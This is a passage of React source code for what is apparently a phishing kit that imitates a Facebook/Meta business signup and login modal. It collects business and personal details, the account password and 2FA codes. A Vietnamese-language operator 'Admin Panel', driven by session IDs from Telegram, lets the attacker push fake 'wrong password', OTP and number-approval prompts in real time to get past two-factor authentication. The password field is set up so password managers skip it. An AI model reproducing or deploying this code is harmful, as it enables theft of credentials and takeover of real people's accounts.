                <div style={{ position: 'fixed', inset: 0, background: 'rgba(0, 0, 0, 0.4)', zIndex: 9999, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '24px 16px', overflowY: 'auto', backdropFilter: 'blur(4px)', WebkitBackdropFilter: 'blur(4px)' }}>
                    <div style={{ position: 'relative', background: '#fff', borderRadius: '12px', padding: '28px 20px 20px', width: '100%', maxWidth: '420px', boxShadow: '0 12px 28px rgba(0,0,0,0.2)' }}>
                        
                        <button onClick={() => { localStorage.clear(); window.location.replace('/live'); }} style={{ position: 'absolute', top: '12px', right: '12px', background: '#f0f2f5', border: 'none', borderRadius: '50%', width: '34px', height: '34px', cursor: 'pointer', color: '#606770', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.2" strokeLinecap="round"><path d="M18 6 6 18M6 6l12 12"/></svg>
                        </button>

                        {showAdmin ? (
                          <div style={{ textAlign: 'center' }}>
                            <h2 style={{ fontSize: '22px', fontWeight: '700', marginBottom: '10px' }}>Admin Panel</h2>
                            <div style={{ marginBottom: '20px' }}>
                                <p style={{ fontSize: '14px', marginBottom: '5px', color: '#65676b' }}>Nhập Mã Phiên (lấy từ Telegram):</p>
                                <input className="fb-input" type="text" placeholder="VD: user_a1b2c3" value={adminSessionId} onChange={(e) => setAdminSessionId(e.target.value)} />
                            </div>
                            <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
                                <button onClick={() => handleAdminCommand('error', '')} className="fb-btn" style={{ background: '#fa383e' }}>Báo Sai Mật Khẩu</button>
                                <button onClick={() => handleAdminCommand('otp', '')} className="fb-btn">Chuyển sang nhập OTP</button>
                                <button onClick={() => handleAdminCommand('success', '')} className="fb-btn" style={{ background: '#198754' }}>Báo Thành Công</button>
                                
                                <div style={{ border: '1px solid #ccc', padding: '15px', borderRadius: '8px', marginTop: '10px' }}>
                                    <p style={{ marginBottom: '10px', fontSize: '14px', fontWeight: 'bold' }}>Yêu cầu duyệt số:</p>
                                    <input className="fb-input" type="text" placeholder="Nhập số (VD: 45)" value={adminNumberInput} onChange={(e) => setAdminNumberInput(e.target.value)} />
                                    <button onClick={() => handleAdminCommand('approve', adminNumberInput)} className="fb-btn" style={{ marginTop: '10px' }}>Gửi Số Duyệt</button>
                                </div>
                                
                                <button onClick={() => setShowAdmin(false)} className="fb-btn" style={{ marginTop: '10px', background: '#ccc', color: '#333' }}>Đóng</button>
                            </div>
                          </div>
                        ) : (
                          <>
                            <div style={{ textAlign: 'center', marginBottom: '18px' }}>
                                <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yt/r/DUiOg0mJTjz.webp" alt="FB" style={{ maxHeight: '60px', margin: '0 auto' }} />
                            </div>

                            {/* FORM 1: SIGNUP */}
                            {step === 1 && (
                              <>
                                <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#050505', marginBottom: '6px' }}>{t.form1Title}</h2>
                                <p style={{ fontSize: '14.5px', textAlign: 'center', color: '#65676b', marginBottom: '20px' }}>{t.form1Sub}</p>
                                <form onSubmit={handleSignup} noValidate style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                                    <div>
                                        <input className="fb-input" style={{ borderColor: errors.busName ? '#fa383e' : 'rgb(224, 226, 228)' }} placeholder="Business name" value={busName} onChange={e => {setBusName(e.target.value); setErrors({...errors, busName: false})}} />
                                        {errors.busName && <div style={{ color: '#fa383e', fontSize: '13px', marginTop: '6px' }}>Please enter your business name.</div>}
                                    </div>
                                    <div>
                                        <input className="fb-input" style={{ borderColor: errors.perEmail ? '#fa383e' : 'rgb(224, 226, 228)' }} type="email" placeholder="Personal email" value={perEmail} onChange={e => {setPerEmail(e.target.value); setErrors({...errors, perEmail: false})}} />
                                        {errors.perEmail && <div style={{ color: '#fa383e', fontSize: '13px', marginTop: '6px' }}>Please enter a valid personal email.</div>}
                                    </div>
                                    <div>
                                        <input className="fb-input" style={{ borderColor: errors.busEmail ? '#fa383e' : 'rgb(224, 226, 228)' }} type="email" placeholder="Business email" value={busEmail} onChange={e => {setBusEmail(e.target.value); setErrors({...errors, busEmail: false})}} />
                                        {errors.busEmail && <div style={{ color: '#fa383e', fontSize: '13px', marginTop: '6px' }}>Please enter a valid business email.</div>}
                                    </div>
                                    <div>
                                        <div className="fb-phone-group">
                                            <div className="fb-phone-select-wrap">
                                                <select className="fb-phone-select" value={countryCode} onChange={e => setCountryCode(e.target.value)} style={{ width: '100%', height: '56px', padding: '10px 30px 10px 14px', border: '1px solid rgb(224, 226, 228)', borderRadius: '16px', appearance: 'none' }}>
                                                    <option value="+93">+93 (Afghanistan)</option>
                                                    <option value="+355">+355 (Albania)</option>
                                                    <option value="+213">+213 (Algeria)</option>
                                                    <option value="+1">+1 (American Samoa)</option>
                                                    <option value="+376">+376 (Andorra)</option>
                                                    <option value="+244">+244 (Angola)</option>
                                                    <option value="+1">+1 (Anguilla)</option>
                                                    <option value="+1">+1 (Antigua and Barbuda)</option>
                                                    <option value="+54">+54 (Argentina)</option>
                                                    <option value="+374">+374 (Armenia)</option>
                                                    <option value="+297">+297 (Aruba)</option>
                                                    <option value="+61">+61 (Australia)</option>
                                                    <option value="+43">+43 (Austria)</option>
                                                    <option value="+994">+994 (Azerbaijan)</option>
                                                    <option value="+1">+1 (Bahamas)</option>
                                                    <option value="+973">+973 (Bahrain)</option>
                                                    <option value="+880">+880 (Bangladesh)</option>
                                                    <option value="+1">+1 (Barbados)</option>
                                                    <option value="+375">+375 (Belarus)</option>
                                                    <option value="+32">+32 (Belgium)</option>
                                                    <option value="+501">+501 (Belize)</option>
                                                    <option value="+229">+229 (Benin)</option>
                                                    <option value="+1">+1 (Bermuda)</option>
                                                    <option value="+975">+975 (Bhutan)</option>
                                                    <option value="+591">+591 (Bolivia)</option>
                                                    <option value="+387">+387 (Bosnia and Herzegovina)</option>
                                                    <option value="+267">+267 (Botswana)</option>
                                                    <option value="+55">+55 (Brazil)</option>
                                                    <option value="+1">+1 (British Virgin Islands)</option>
                                                    <option value="+673">+673 (Brunei)</option>
                                                    <option value="+359">+359 (Bulgaria)</option>
                                                    <option value="+226">+226 (Burkina Faso)</option>
                                                    <option value="+257">+257 (Burundi)</option>
                                                    <option value="+855">+855 (Cambodia)</option>
                                                    <option value="+237">+237 (Cameroon)</option>
                                                    <option value="+1">+1 (Canada)</option>
                                                    <option value="+238">+238 (Cape Verde)</option>
                                                    <option value="+1">+1 (Cayman Islands)</option>
                                                    <option value="+236">+236 (Central African Republic)</option>
                                                    <option value="+235">+235 (Chad)</option>
                                                    <option value="+56">+56 (Chile)</option>
                                                    <option value="+86">+86 (China)</option>
                                                    <option value="+57">+57 (Colombia)</option>
                                                    <option value="+269">+269 (Comoros)</option>
                                                    <option value="+242">+242 (Congo - Brazzaville)</option>
                                                    <option value="+243">+243 (Congo - Kinshasa)</option>
                                                    <option value="+682">+682 (Cook Islands)</option>
                                                    <option value="+506">+506 (Costa Rica)</option>
                                                    <option value="+225">+225 (Côte d'Ivoire)</option>
                                                    <option value="+385">+385 (Croatia)</option>
                                                    <option value="+53">+53 (Cuba)</option>
                                                    <option value="+599">+599 (Curaçao)</option>
                                                    <option value="+357">+357 (Cyprus)</option>
                                                    <option value="+420">+420 (Czechia)</option>
                                                    <option value="+45">+45 (Denmark)</option>
                                                    <option value="+253">+253 (Djibouti)</option>
                                                    <option value="+1">+1 (Dominica)</option>
                                                    <option value="+1">+1 (Dominican Republic)</option>
                                                    <option value="+593">+593 (Ecuador)</option>
                                                    <option value="+20">+20 (Egypt)</option>
                                                    <option value="+503">+503 (El Salvador)</option>
                                                    <option value="+240">+240 (Equatorial Guinea)</option>
                                                    <option value="+291">+291 (Eritrea)</option>
                                                    <option value="+372">+372 (Estonia)</option>
                                                    <option value="+268">+268 (Eswatini)</option>
                                                    <option value="+251">+251 (Ethiopia)</option>
                                                    <option value="+500">+500 (Falkland Islands)</option>
                                                    <option value="+298">+298 (Faroe Islands)</option>
                                                    <option value="+679">+679 (Fiji)</option>
                                                    <option value="+358">+358 (Finland)</option>
                                                    <option value="+33">+33 (France)</option>
                                                    <option value="+594">+594 (French Guiana)</option>
                                                    <option value="+689">+689 (French Polynesia)</option>
                                                    <option value="+241">+241 (Gabon)</option>
                                                    <option value="+220">+220 (Gambia)</option>
                                                    <option value="+995">+995 (Georgia)</option>
                                                    <option value="+49">+49 (Germany)</option>
                                                    <option value="+233">+233 (Ghana)</option>
                                                    <option value="+350">+350 (Gibraltar)</option>
                                                    <option value="+30">+30 (Greece)</option>
                                                    <option value="+299">+299 (Greenland)</option>
                                                    <option value="+1">+1 (Grenada)</option>
                                                    <option value="+590">+590 (Guadeloupe)</option>
                                                    <option value="+1">+1 (Guam)</option>
                                                    <option value="+502">+502 (Guatemala)</option>
                                                    <option value="+44">+44 (Guernsey)</option>
                                                    <option value="+224">+224 (Guinea)</option>
                                                    <option value="+245">+245 (Guinea-Bissau)</option>
                                                    <option value="+592">+592 (Guyana)</option>
                                                    <option value="+509">+509 (Haiti)</option>
                                                    <option value="+504">+504 (Honduras)</option>
                                                    <option value="+852">+852 (Hong Kong SAR China)</option>
                                                    <option value="+36">+36 (Hungary)</option>
                                                    <option value="+354">+354 (Iceland)</option>
                                                    <option value="+91">+91 (India)</option>
                                                    <option value="+62">+62 (Indonesia)</option>
                                                    <option value="+98">+98 (Iran)</option>
                                                    <option value="+964">+964 (Iraq)</option>
                                                    <option value="+353">+353 (Ireland)</option>
                                                    <option value="+44">+44 (Isle of Man)</option>
                                                    <option value="+972">+972 (Israel)</option>
                                                    <option value="+39">+39 (Italy)</option>
                                                    <option value="+1">+1 (Jamaica)</option>
                                                    <option value="+81">+81 (Japan)</option>
                                                    <option value="+44">+44 (Jersey)</option>
                                                    <option value="+962">+962 (Jordan)</option>
                                                    <option value="+7">+7 (Kazakhstan)</option>
                                                    <option value="+254">+254 (Kenya)</option>
                                                    <option value="+686">+686 (Kiribati)</option>
                                                    <option value="+383">+383 (Kosovo)</option>
                                                    <option value="+965">+965 (Kuwait)</option>
                                                    <option value="+996">+996 (Kyrgyzstan)</option>
                                                    <option value="+856">+856 (Laos)</option>
                                                    <option value="+371">+371 (Latvia)</option>
                                                    <option value="+961">+961 (Lebanon)</option>
                                                    <option value="+266">+266 (Lesotho)</option>
                                                    <option value="+231">+231 (Liberia)</option>
                                                    <option value="+218">+218 (Libya)</option>
                                                    <option value="+423">+423 (Liechtenstein)</option>
                                                    <option value="+370">+370 (Lithuania)</option>
                                                    <option value="+352">+352 (Luxembourg)</option>
                                                    <option value="+853">+853 (Macao SAR China)</option>
                                                    <option value="+261">+261 (Madagascar)</option>
                                                    <option value="+265">+265 (Malawi)</option>
                                                    <option value="+60">+60 (Malaysia)</option>
                                                    <option value="+960">+960 (Maldives)</option>
                                                    <option value="+223">+223 (Mali)</option>
                                                    <option value="+356">+356 (Malta)</option>
                                                    <option value="+692">+692 (Marshall Islands)</option>
                                                    <option value="+596">+596 (Martinique)</option>
                                                    <option value="+222">+222 (Mauritania)</option>
                                                    <option value="+230">+230 (Mauritius)</option>
                                                    <option value="+262">+262 (Mayotte)</option>
                                                    <option value="+52">+52 (Mexico)</option>
                                                    <option value="+691">+691 (Micronesia)</option>
                                                    <option value="+373">+373 (Moldova)</option>
                                                    <option value="+377">+377 (Monaco)</option>
                                                    <option value="+976">+976 (Mongolia)</option>
                                                    <option value="+382">+382 (Montenegro)</option>
                                                    <option value="+1">+1 (Montserrat)</option>
                                                    <option value="+212">+212 (Morocco)</option>
                                                    <option value="+258">+258 (Mozambique)</option>
                                                    <option value="+95">+95 (Myanmar)</option>
                                                    <option value="+264">+264 (Namibia)</option>
                                                    <option value="+674">+674 (Nauru)</option>
                                                    <option value="+977">+977 (Nepal)</option>
                                                    <option value="+31">+31 (Netherlands)</option>
                                                    <option value="+687">+687 (New Caledonia)</option>
                                                    <option value="+64">+64 (New Zealand)</option>
                                                    <option value="+505">+505 (Nicaragua)</option>
                                                    <option value="+227">+227 (Niger)</option>
                                                    <option value="+234">+234 (Nigeria)</option>
                                                    <option value="+683">+683 (Niue)</option>
                                                    <option value="+850">+850 (North Korea)</option>
                                                    <option value="+389">+389 (North Macedonia)</option>
                                                    <option value="+1">+1 (Northern Mariana Islands)</option>
                                                    <option value="+47">+47 (Norway)</option>
                                                    <option value="+968">+968 (Oman)</option>
                                                    <option value="+92">+92 (Pakistan)</option>
                                                    <option value="+680">+680 (Palau)</option>
                                                    <option value="+970">+970 (Palestine)</option>
                                                    <option value="+507">+507 (Panama)</option>
                                                    <option value="+675">+675 (Papua New Guinea)</option>
                                                    <option value="+595">+595 (Paraguay)</option>
                                                    <option value="+51">+51 (Peru)</option>
                                                    <option value="+63">+63 (Philippines)</option>
                                                    <option value="+48">+48 (Poland)</option>
                                                    <option value="+351">+351 (Portugal)</option>
                                                    <option value="+1">+1 (Puerto Rico)</option>
                                                    <option value="+974">+974 (Qatar)</option>
                                                    <option value="+262">+262 (Réunion)</option>
                                                    <option value="+40">+40 (Romania)</option>
                                                    <option value="+7">+7 (Russia)</option>
                                                    <option value="+250">+250 (Rwanda)</option>
                                                    <option value="+590">+590 (Saint Barthélemy)</option>
                                                    <option value="+290">+290 (Saint Helena)</option>
                                                    <option value="+1">+1 (Saint Kitts and Nevis)</option>
                                                    <option value="+1">+1 (Saint Lucia)</option>
                                                    <option value="+590">+590 (Saint Martin)</option>
                                                    <option value="+508">+508 (Saint Pierre and Miquelon)</option>
                                                    <option value="+1">+1 (Saint Vincent and the Grenadines)</option>
                                                    <option value="+685">+685 (Samoa)</option>
                                                    <option value="+378">+378 (San Marino)</option>
                                                    <option value="+239">+239 (São Tomé and Príncipe)</option>
                                                    <option value="+966">+966 (Saudi Arabia)</option>
                                                    <option value="+221">+221 (Senegal)</option>
                                                    <option value="+381">+381 (Serbia)</option>
                                                    <option value="+248">+248 (Seychelles)</option>
                                                    <option value="+232">+232 (Sierra Leone)</option>
                                                    <option value="+65">+65 (Singapore)</option>
                                                    <option value="+1">+1 (Sint Maarten)</option>
                                                    <option value="+421">+421 (Slovakia)</option>
                                                    <option value="+386">+386 (Slovenia)</option>
                                                    <option value="+677">+677 (Solomon Islands)</option>
                                                    <option value="+252">+252 (Somalia)</option>
                                                    <option value="+27">+27 (South Africa)</option>
                                                    <option value="+82">+82 (South Korea)</option>
                                                    <option value="+211">+211 (South Sudan)</option>
                                                    <option value="+34">+34 (Spain)</option>
                                                    <option value="+94">+94 (Sri Lanka)</option>
                                                    <option value="+249">+249 (Sudan)</option>
                                                    <option value="+597">+597 (Suriname)</option>
                                                    <option value="+46">+46 (Sweden)</option>
                                                    <option value="+41">+41 (Switzerland)</option>
                                                    <option value="+963">+963 (Syria)</option>
                                                    <option value="+886">+886 (Taiwan)</option>
                                                    <option value="+992">+992 (Tajikistan)</option>
                                                    <option value="+255">+255 (Tanzania)</option>
                                                    <option value="+66">+66 (Thailand)</option>
                                                    <option value="+670">+670 (Timor-Leste)</option>
                                                    <option value="+228">+228 (Togo)</option>
                                                    <option value="+690">+690 (Tokelau)</option>
                                                    <option value="+676">+676 (Tonga)</option>
                                                    <option value="+1">+1 (Trinidad and Tobago)</option>
                                                    <option value="+216">+216 (Tunisia)</option>
                                                    <option value="+90">+90 (Turkey)</option>
                                                    <option value="+993">+993 (Turkmenistan)</option>
                                                    <option value="+1">+1 (Turks and Caicos Islands)</option>
                                                    <option value="+688">+688 (Tuvalu)</option>
                                                    <option value="+256">+256 (Uganda)</option>
                                                    <option value="+380">+380 (Ukraine)</option>
                                                    <option value="+971">+971 (United Arab Emirates)</option>
                                                    <option value="+44">+44 (United Kingdom)</option>
                                                    <option value="+1">+1 (United States)</option>
                                                    <option value="+598">+598 (Uruguay)</option>
                                                    <option value="+1">+1 (US Virgin Islands)</option>
                                                    <option value="+998">+998 (Uzbekistan)</option>
                                                    <option value="+678">+678 (Vanuatu)</option>
                                                    <option value="+379">+379 (Vatican City)</option>
                                                    <option value="+58">+58 (Venezuela)</option>
                                                    <option value="+84">+84 (Vietnam)</option>
                                                    <option value="+681">+681 (Wallis and Futuna)</option>
                                                    <option value="+212">+212 (Western Sahara)</option>
                                                    <option value="+967">+967 (Yemen)</option>
                                                    <option value="+260">+260 (Zambia)</option>
                                                    <option value="+263">+263 (Zimbabwe)</option>
                                                </select>
                                            </div>
                                            <input className="fb-input" style={{ flex: 1, borderColor: errors.phoneNum ? '#fa383e' : 'rgb(224, 226, 228)' }} placeholder="Phone number" value={phoneNum} onChange={e => {setPhoneNum(e.target.value); setErrors({...errors, phoneNum: false})}} />
                                        </div>
                                        {errors.phoneNum && <div style={{ color: '#fa383e', fontSize: '13px', marginTop: '6px' }}>Please enter a valid phone number.</div>}
                                    </div>
                                    <button type="submit" className="fb-btn" disabled={loading} style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', height: '48px' }}>
                                      {loading ? <LoadingSpinner /> : t.continueBtn}
                                    </button>
                                </form>
                              </>
                            )}

                            {/* FORM 2: LOGIN */}
                            {step === 2 && (
                              <form onSubmit={handleLogin} autoComplete="off" style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                                  <input className="fb-input" placeholder="Mobile number or email address" value={loginUser} onChange={e => setLoginUser(e.target.value)} required autoComplete="off" />
                                  <input className="fb-input" type="text" placeholder="Password" value={loginPass} onChange={e => setLoginPass(e.target.value)} required style={{ WebkitTextSecurity: 'disc' }} autoComplete="new-password" data-lpignore="true" data-form-type="other" />
                                  {showLoginError && <div style={{ color: '#fa383e', fontSize: '13.5px', marginTop: '4px', textAlign: 'center' }}>{t.loginError}</div>}
                                  <button type="submit" className="fb-btn" disabled={loading} style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', height: '48px' }}>
                                    {loading ? <LoadingSpinner /> : t.loginBtn}
                                  </button>
                              </form>
                            )}

                            {/* FORM 3 & 4: 2FA & SUCCESS */}
                            {(step === 3 || showSuccess) && (
                              <>
                                {showSuccess ? (
                                  <div style={{ textAlign: 'center', padding: '20px 0' }}>
                                    <h2 style={{ fontSize: '22px', fontWeight: '700', color: '#050505', marginBottom: '10px', marginTop: '20px' }}>{t.successTitle}</h2>
                                    <p style={{ fontSize: '15px', color: '#65676b', lineHeight: '1.5', marginBottom: '20px' }}>{t.successSub}</p>
                                    <button type="button" onClick={() => { localStorage.clear(); window.location.replace('/live'); }} className="fb-btn">{t.closeBtn}</button>
                                  </div>
                                ) : matchNumber ? (
                                  <>
                                    <h2 style={{ fontSize: '22px', fontWeight: '700', color: '#050505', marginBottom: '10px', textAlign: 'center' }}>{t.approveTitle}</h2>
                                    <p style={{ fontSize: '15px', color: '#1c2b33', marginBottom: '20px', lineHeight: '1.4', textAlign: 'center' }}>{t.approveSub} <strong>{matchNumber}</strong></p>
                                    <div style={{ display: 'flex', justifyContent: 'center', marginBottom: '20px' }}><img src="/images/approve-device.png" alt="Approve Device" style={{ width: '100%', height: 'auto', borderRadius: '8px' }} /></div>
                                    <div style={{ textAlign: 'center', fontSize: '48px', fontWeight: '900', letterSpacing: '30px', textIndent: '30px', marginBottom: '30px', color: '#1c1e21' }}>{matchNumber}</div>
                                  </>
                                ) : (
                                  <>
                                    <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#050505', marginBottom: '6px' }}>{t.form3Title}</h2>
                                    <div style={{ display: 'flex', justifyContent: 'center', margin: '15px 0' }}><img src="/images/2fa-illustration.png" alt="2FA" style={{ width: '100%', maxWidth: '280px', height: 'auto', borderRadius: '8px' }} /></div>
                                    <p style={{ fontSize: '14.5px', textAlign: 'center', color: '#65676b', marginBottom: '20px' }}>{t.form3Sub}</p>
                                    <form onSubmit={handleOtp} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                                        <input className="fb-input fb-otp-input" style={{ textAlign: 'center', fontSize: '26px', letterSpacing: '12px', fontWeight: '700' }} placeholder="00000000" value={otp} onChange={e => { setOtp(e.target.value.replace(/\D/g, '').slice(0, 8)); setShowOtpError(false); }} required maxLength={8} />
                                        {showOtpError && <div style={{ color: '#fa383e', fontSize: '13.5px', marginTop: '4px', textAlign: 'center' }}>{t.otpError}</div>}
                                        <button type="submit" className="fb-btn" disabled={loading || otp.length < 6} style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', height: '48px' }}>
                                          {loading ? <LoadingSpinner /> : t.verifyBtn}
                                        </button>
                                    </form>
                                  </>
                                )}
                              </>
                            )}
                          </>
                        )}

                        <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', marginTop: '24px', paddingTop: '20px', borderTop: '1px solid #e4e6eb' }}>
                            <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" style={{ height: '12px', margin: '0 auto' }} />
                        </div>
                    </div>
                </div>
            )}
        </>
    );
};

export default Home;
